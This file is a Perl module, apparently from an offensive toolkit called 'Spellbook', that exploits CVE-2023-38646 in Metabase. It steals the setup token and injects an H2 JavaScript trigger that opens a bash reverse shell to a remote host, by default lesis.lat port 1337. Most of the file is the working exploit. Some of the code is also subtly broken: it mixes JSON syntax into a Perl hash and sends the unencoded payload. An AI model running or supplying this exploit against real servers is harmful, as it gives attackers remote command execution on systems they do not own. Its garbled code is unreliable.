package Spellbook::Advisory::CVE_2023_38646 {
    use strict;
    use warnings;
    use JSON;
    use Try::Tiny;
    use MIME::Base64;
    use HTTP::Request;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        my $remote = 'lesis.lat';
        my $port   = 1337;

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target,
            "r|remote=s" => \$remote,
            "p|port=i"   => \$port
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//x) {
                $target = "https://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $initial_request   = $userAgent -> get("$target/api/session/properties");

            if ($initial_request -> code() == 200) {
                try {
                    my $content = decode_json($initial_request -> content);
                    my $token = $content -> {"setup-token"};

                    if ($token) {
                        my $headers = HTTP::Headers -> new ("Content-Type" => "application/json");
                        my $reverse = encode_base64("bash -i >& /dev/tcp/$remote/$port 0>&1", "");

                        my $payload = {
                            "token": "$token",
                            "details": {
                                "is_on_demand": false,
                                "is_full_sync": false,
                                "is_sample": false,
                                "cache_ttl": null,
                                "refingerprint": false,
                                "auto_run_queries": true,
                                "schedules": {},
                                "details": {
                                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS \$\$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,$reverse}|{base64,-d}|{bash,-i}')\\n\$\$--=x",
                                    "advanced-options": false,
                                    "ssl": true
                                },
                                "name": "an-sec-research-team",
                                "engine": "h2"
                            }
                        };

                        my $json_payload = encode_json($payload);

                        my $exploit_request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
                        my $response = $userAgent -> request($exploit_request);

                        if ($response -> code() == 400) {
                            push @result, "\n[+] $target exploited\n";
                        }
                    }
                }
            }

            return @result;
        }

        if ($help) {
            return<<"EOT";

Exploit::CVE_2023_38646
=======================
-h, --help     See this menu
-t, --target   Define a target
-r, --remote   Set the address to receive the reverse shell
-p, --port     Set the port of reverse shell\n\n";

EOT
        }

        return 0;
    }
}

1;